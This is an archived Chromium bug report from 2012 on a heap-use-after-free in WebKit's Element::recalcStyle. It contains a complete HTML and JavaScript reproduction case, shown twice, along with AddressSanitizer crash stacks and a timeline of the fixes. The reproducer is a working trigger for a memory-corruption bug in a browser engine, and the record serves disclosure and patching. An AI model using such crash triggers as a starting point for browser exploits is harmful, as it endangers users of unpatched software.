# Heap-use-after-free in WebCore::Element::recalcStyle

| Field | Value |
|-------|-------|
| **Issue ID** | [40055790](https://issues.chromium.org/issues/40055790) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | mi...@gmail.com |
| **Assignee** | in...@chromium.org |
| **Created** | 2012-03-28 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

use-after-free in WebCore::Element::recalcStyle

**VERSION**  

Chrome Version: stable, beta, dev

Chromium 19.0.1085.0 (Developer Build 129391)  

OS Linux  

WebKit 536.5 (@112327)  

JavaScript V8 3.9.24.2

Operating System: 64bit linux

**REPRODUCTION CASE**

<html>
<head>
<style>
#el0 {
display: inline-table;
}
#el0::before {
display: table-row-group;
}
#el2:nth-child(0) {
}
#el2 {
display: table-column-group;
}
</style>
<script>
onload = function() {
el0=document.createElement('q')
el0.setAttribute('id','el0')
document.body.appendChild(el0)
el1=document.createElement('div')
el0.appendChild(el1)
el2=document.createElement('div')
el2.setAttribute('id','el2')
el0.appendChild(el2)
document.designMode='on'
document.execCommand('selectall')
document.execCommand('FormatBlock', false, '<'+'pre>')
document.execCommand('Undo')
el0.insertBefore(document.createElement('td'), el1)
document.execCommand('FormatBlock', false, '<'+'pre>')
}
</script>
</head>
<body>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: renderer+asan  

Crash State:

==9112== ERROR: AddressSanitizer heap-use-after-free on address 0x7fffe5720c88 at pc 0x55555927de5a bp 0x7fffffff49b0 sp 0x7fffffff49a8  

READ of size 8 at 0x7fffe5720c88 thread T0  

#0 0x55555927de5a in WebCore::Element::recalcStyle(WebCore::Node::StyleChange) ???:0  

#1 0x55555927d718 in WebCore::Element::recalcStyle(WebCore::Node::StyleChange) ???:0

0x7fffe5720c88 is located 8 bytes inside of 104-byte region [0x7fffe5720c80,0x7fffe5720ce8)  

freed by thread T0 here:  

#0 0x55555de43112 in free ??:0  

#1 0x55555ac99e72 in WebCore::RenderObjectChildList::updateBeforeAfterContent(WebCore::RenderObject\*, WebCore::PseudoId, WebCore::RenderObject const\*) ???:0  

#2 0x55555aa2d5ec in WebCore::RenderBlock::styleDidChange(WebCore::StyleDifference, WebCore::RenderStyle const\*) ???:0

## Attachments

- [8104.txt](attachments/8104.txt) (text/plain; charset=us-ascii, 14.1 KB)
- [stable-8104.txt](attachments/stable-8104.txt) (text/plain; charset=us-ascii, 13.7 KB)
- [8104.html](attachments/8104.html) (text/html; charset=us-ascii, 941 B)
- [beta-8104.txt](attachments/beta-8104.txt) (text/plain; charset=us-ascii, 14.2 KB)

## Timeline

### in...@chromium.org (2012-03-28)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=31591172

Uploader: inferno@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7ffb4a32b308
Crash State:
  - crash stack -
  WebCore::Element::recalcStyle
  WebCore::Element::recalcStyle
  - free stack -
  WebCore::RenderObjectChildList::updateBeforeAfterContent
  WebCore::RenderBlock::styleDidChange
  

Minimized Testcase (0.85 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv96_QwtsGDU9JzDfv5AI0DLxTGQP9YBwk5bI_TYHW2f1sr63r3-VSP7FDTsjJB90qhxiJzJjO1i73Z1BdLTk_YOydO-i2RdtWJKeeDbSU04XumS0EABQ0rOzHXcBAJUiZ3T8kEss6pPRvf6huNYPt00L5BeK3g
<style>
      #el0 {
        display: inline-table;
      }
      #el0::before {
        display: table-row-group;
      }
      #el2:nth-child(0) {
      }
      #el2 {
        display: table-column-group;
</style>
    <script>
      onload = function() {
        el0=document.createElement('q')
        el0.setAttribute('id','el0')
        document.body.appendChild(el0)
        el1=document.createElement('div')
        el0.appendChild(el1)
        el2=document.createElement('div')
        el2.setAttribute('id','el2')
        el0.appendChild(el2)
        document.designMode='on'
        document.execCommand('selectall')
        document.execCommand('FormatBlock', false, '<'+'pre>')
        document.execCommand('Undo')
        el0.insertBefore(document.createElement('td'), el1)
        document.execCommand('FormatBlock', false, '<'+'pre>')
      }
    </script>

### in...@chromium.org (2012-03-28)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-03-29)

Man, this bug is tough - https://bugs.webkit.org/show_bug.cgi?id=82630

### ka...@google.com (2012-03-30)

[Empty comment from Monorail migration]

### ka...@google.com (2012-03-30)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-03-30)

Reverting wrong marking of security bugs by release management.

### in...@chromium.org (2012-03-31)

[Empty comment from Monorail migration]

### cl...@chromium.org (2012-04-05)

ClusterFuzz has detected this issue as fixed in range 130617:130650.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=31591172

Uploader: inferno@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7ffb4a32b308
Crash State:
  - crash stack -
  WebCore::Element::recalcStyle
  WebCore::Element::recalcStyle
  - free stack -
  WebCore::RenderObjectChildList::updateBeforeAfterContent
  WebCore::RenderBlock::styleDidChange
  
Fixed: https://cluster-fuzz.appspot.com/revisions?range=130617:130650

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv96_QwtsGDU9JzDfv5AI0DLxTGQP9YBwk5bI_TYHW2f1sr63r3-VSP7FDTsjJB90qhxiJzJjO1i73Z1BdLTk_YOydO-i2RdtWJKeeDbSU04XumS0EABQ0rOzHXcBAJUiZ3T8kEss6pPRvf6huNYPt00L5BeK3g

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### in...@chromium.org (2012-04-05)

ignore last comment. Bug is not fixed. There was a v8 bug which is causing asan builds to mess up on ClusterFuzz.

### in...@chromium.org (2012-04-09)

Fixed in

1. http://trac.webkit.org/changeset/113252
2. http://trac.webkit.org/changeset/113497
3. http://trac.webkit.org/changeset/113581


### cl...@chromium.org (2012-04-10)

ClusterFuzz has detected this issue as fixed in range 131479:131513.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=31591172

Uploader: inferno@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7ffb4a32b308
Crash State:
  - crash stack -
  WebCore::Element::recalcStyle
  WebCore::Element::recalcStyle
  - free stack -
  WebCore::RenderObjectChildList::updateBeforeAfterContent
  WebCore::RenderBlock::styleDidChange
  
Fixed: https://cluster-fuzz.appspot.com/revisions?range=131479:131513

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv96_QwtsGDU9JzDfv5AI0DLxTGQP9YBwk5bI_TYHW2f1sr63r3-VSP7FDTsjJB90qhxiJzJjO1i73Z1BdLTk_YOydO-i2RdtWJKeeDbSU04XumS0EABQ0rOzHXcBAJUiZ3T8kEss6pPRvf6huNYPt00L5BeK3g

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### in...@chromium.org (2012-04-10)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-04-24)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-04-24)

Awesome catch miaubiz! This bug has been very helpful to stabilize beforeChild handling in tables.

### sc...@gmail.com (2012-04-30)

M19:
http://trac.webkit.org/changeset/115615
http://trac.webkit.org/changeset/115616
http://trac.webkit.org/changeset/115617


### sc...@gmail.com (2012-05-10)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-05-14)

[Empty comment from Monorail migration]

### [Deleted User] (2012-05-15)

Updating status to Fixed on security bugs which were fixed when m19 went to stable.

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-14)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/120711?no_tracker_redirect=1

[Monorail mergedwith: crbug.com/chromium/121861]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40055790)*
